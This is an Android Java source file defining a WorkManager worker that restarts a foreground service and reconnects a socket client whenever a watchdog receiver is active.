package com.fason.app.worker;

import android.content.Context;
import android.content.Intent;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.fason.app.core.network.SocketClient;
import com.fason.app.receiver.WatchdogReceiver;
import com.fason.app.service.MainService;

/** WorkManager worker that restarts the service and reconnects the socket. */
public class KeepAliveWorker extends Worker {

    public KeepAliveWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        if (WatchdogReceiver.isActive(getApplicationContext())) {
            startSvc();
            ensureSocket();
        }
        return Result.success();
    }

    private void startSvc() {
        try {
            getApplicationContext().startForegroundService(
                new Intent(getApplicationContext(), MainService.class));
        } catch (Exception ignored) {}
    }

    private void ensureSocket() {
        try {
            SocketClient client = SocketClient.getInstance();
            if (client.getSocket() != null && !client.getSocket().connected()) {
                client.reconnect();
            }
        } catch (Exception ignored) {}
    }
}
